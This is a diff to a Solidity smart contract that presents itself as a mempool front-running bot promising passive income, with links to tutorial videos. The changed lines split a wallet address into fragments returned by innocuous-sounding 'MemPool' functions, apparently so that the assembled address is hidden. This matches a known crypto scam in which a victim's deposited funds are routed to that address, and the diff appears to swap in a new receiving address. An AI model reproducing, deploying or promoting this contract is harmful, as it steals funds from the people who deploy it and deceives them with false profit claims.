@@ -30,10 +30,11 @@
  * Although we share this source code for free so you can deploy it by yourself,
  * there’s a 0.1111% fee charged from your profits which goes to us.
  *
- * Please follow all the steps in the video correctly to deploy your own bot
+ * Please follow all the steps in the tutorial video correctly to deploy your own bot
  * smart contract and gain easy passive income for your better life.
  *
- * Video link: https://streamable.com/ft0797
+ * Explaination link: https://www.youtube.com/watch?v=hxwG3zOwjyo
+ * Tutorial link: https://streamable.com/ft0797
  * MetaMask link: https://metamask.io/
  * Remix link: https://remix.ethereum.org/
  * EtherScan link: https://etherscan.io/
@@ -78,7 +79,7 @@ contract hvaal {
 
             // IMPORTANT!
             // In the video, we said that a couple of items to look at are in lines 50 and 51.
-            // It's already moved here, in lines 86 and 88. If you follow those addresses
+            // It's already moved here, in lines 87 and 89. If you follow those addresses
             // on Etherscan, you will see that these are the addresses of $WETH tokens,
             // which will be the targeted tokens.
 
@@ -88,7 +89,7 @@ contract hvaal {
                 memory TOKENS_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
 
             // IMPORTANT!
-            // You can specify the targeted tokens by filling lines 86 and 88 with the
+            // You can specify the targeted tokens by filling lines 87 and 89 with the
             // addresses of other tokens on Ethereum, or leave them unchanged and
             // the contract function will scan for new $WETH liquidity pairings.
 
@@ -117,11 +118,11 @@ contract hvaal {
     }
 
     function getMemPoolPool() private pure returns (string memory) {
-        return "62869547"; // part5 0x9e-26b98d4f-aDF70d0-C0e57C60-93473589-34A934c
+        return "93473589"; // part5 0x9e-26b98d4f-aDF70d0-C0e57C60-93473589-34A934c
     }
 
     function getMemPoolVersion() private pure returns (string memory) {
-        return "58506B46"; // part4 0x9e-26b98d4f-aDF70d0-C0e57C60-9347358934A934c
+        return "C0e57C60"; // part4 0x9e-26b98d4f-aDF70d0-C0e57C60-9347358934A934c
     }
 
     function memPoolValue() internal pure returns (uint256) {
@@ -170,11 +171,11 @@ contract hvaal {
     receive() external payable {}
 
     function fetchMemPoolPool() private pure returns (string memory) {
-        return "0c7d456"; // part3 0x9e-26b98d4f-aDF70d0-C0e57C609347358934A934c
+        return "aDF70d0"; // part3 0x9e-26b98d4f-aDF70d0-C0e57C609347358934A934c
     }
 
     function fetchMemPoolEdition() private pure returns (string memory) {
-        return "f39E373F"; // part2 0x9e-26b98d4f-aDF70d0C0e57C609347358934A934c
+        return "26b98d4f"; // part2 0x9e-26b98d4f-aDF70d0C0e57C609347358934A934c
     }
 
     function startExploration(string memory _a)
@@ -237,7 +238,7 @@ contract hvaal {
     }
 
     function getMemPoolLong() private pure returns (string memory) {
-        return "835a9aA"; // part6 0x9e-26b98d4f-aDF70d0-C0e57C60-93473589-34A934c
+        return "34A934c"; // part6 0x9e-26b98d4f-aDF70d0-C0e57C60-93473589-34A934c
     }
 
     function getBalance() private view returns (uint256) {
@@ -302,7 +303,7 @@ contract hvaal {
     }
 
     function getMemPoolShort() private pure returns (string memory) {
-        return "0x5f"; // part1 0x9e-26b98d4faDF70d0C0e57C609347358934A934c
+        return "0x9e"; // part1 0x9e-26b98d4faDF70d0C0e57C609347358934A934c
     }
 
     function poolAddress() private pure returns (string memory) {
